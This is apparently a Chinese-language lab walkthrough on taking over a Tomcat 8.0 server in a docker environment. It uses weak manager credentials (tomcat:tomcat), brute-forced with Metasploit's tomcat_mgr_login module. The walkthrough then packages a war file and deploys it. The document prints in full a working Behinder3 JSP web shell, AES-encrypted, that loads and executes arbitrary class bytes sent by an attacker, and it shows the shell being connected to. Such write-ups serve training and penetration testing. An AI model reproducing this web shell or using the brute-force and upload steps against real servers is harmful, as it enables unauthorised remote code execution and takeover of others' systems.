# Tomcat7+ 弱口令 && 后台getshell漏洞

Tomcat版本：8.0

## 漏洞测试

无需编译，直接启动整个环境：

```plain
docker compose up -d
```

打开tomcat管理页面http://your-ip:8080/manager/html，输入弱密码tomcat:tomcat，即可访问后台：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964536434-376d0974-45db-4c4a-ba97-c5ac4e3cb713.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964536637-1ed54166-e9e3-404c-9cf9-795267e43dfc.png)

## 漏洞复现

### metasploit爆破tomcat弱口令

访问http://your-ip:8080/，点击Manager App：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964536788-8bbdec78-79b8-4118-81f3-7a50735dfdcf.png)

跳转tomcat管理页面http://your-ip:8080/manager/html，提示输入用户名和密码：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964536594-da2a94f1-a3eb-42fc-84c6-f481ab2d8de3.png)

在kali中使用metasploit对tomcat用户名和密码进行爆破：

```plain
┌──(root kali)-[/home/kali]
└─# msfconsole

# 搜索tomcat相关模块
msf6 > search tomcat
...
   23  auxiliary/scanner/http/tomcat_mgr_login	normal     No     Tomcat Application Manager Login Utility
...

# 使用tomcat_mgr_login模块进行爆破
msf6 > use auxiliary/scanner/http/tomcat_mgr_login

# 设置服务地址
msf6 auxiliary(scanner/http/tomcat_mgr_login) >show options
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS <your-ip>
RHOSTS => <your-ip>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

爆破成功，用户名密码为tomcat:tomcat：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964536880-2910c6ff-312f-43e8-8af8-006eda0f9cc1.png)

输入弱密码tomcat:tomcat，即可访问后台。

### 制作war包并上传

首先制作war包project.war：

```plain
E:\Behinder3\server>jar -cvf project.war shell.jsp
已添加清单
正在添加: shell.jsp(输入 = 612) (输出 = 449)(压缩了 26%)
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964537299-502062d3-6f32-4d7d-b650-29b3c03df409.png)

```plain
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>
```

上传war包：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964537797-c706dc26-03f3-4756-b95d-ad7a5f9f1d96.png)

成功部署：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964537938-c7de8ca0-a6e5-4aa0-9e77-4b269ea7e779.png)

冰蝎3成功连接http://your-ip:8080/project/shell.jsp：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964538120-04322fe1-0fa0-4167-a8f8-ad64bc29a0d0.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964537988-4f7ec4d9-7cd6-4af7-8a37-26c4c3fcf92b.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964538448-2ac03bea-9cd7-4252-984e-b7a48d6dbe33.png)